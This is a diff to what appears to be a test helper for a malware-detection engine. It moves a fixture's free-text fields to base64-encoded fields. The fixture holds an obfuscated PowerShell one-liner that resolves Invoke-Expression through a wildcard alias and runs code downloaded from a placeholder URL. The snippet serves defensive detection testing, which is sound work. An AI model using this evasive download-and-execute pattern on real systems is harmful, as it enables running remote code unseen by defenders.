@@ -125,8 +125,8 @@ def detection_response_json(findings: list[dict]) -> str:
 
 
 def _b64(text: str) -> str:
-    """Match the real `example_snippet_b64` schema `DETECTION_SYSTEM_PROMPT`
-    asks for -- see `engine.detect._decode_example_snippet`."""
+    """Match the real `*_b64` schema `DETECTION_SYSTEM_PROMPT` asks for every
+    free-text field -- see `engine.detect._decode_b64_field`."""
     return base64.b64encode(text.encode("utf-8")).decode("ascii")
 
 
@@ -134,8 +134,8 @@ def wildcard_finding_dict(finding_id: str = "f1") -> dict:
     return {
         "id": finding_id,
         "category": "wildcard_resolution",
-        "technique_name": "Wildcard Get-Alias resolution of Invoke-Expression",
-        "description": (
+        "technique_name_b64": _b64("Wildcard Get-Alias resolution of Invoke-Expression"),
+        "description_b64": _b64(
             "The report shows Get-Alias invoked with a wildcard pattern ('i*x') to "
             "resolve the 'iex' alias at runtime, then invokes the resolved command "
             "object directly via the call operator, so the literal string "
@@ -144,7 +144,7 @@ def wildcard_finding_dict(finding_id: str = "f1") -> dict:
         "example_snippet_b64": _b64("&(Get-Alias i*x) (irm https://example.com/a)"),
         "confidence": 0.92,
         "attack_mapping": "T1027.010 (parent: T1027)",
-        "source_ref": "paragraph 2",
+        "source_ref_b64": _b64("paragraph 2"),
     }
 
 
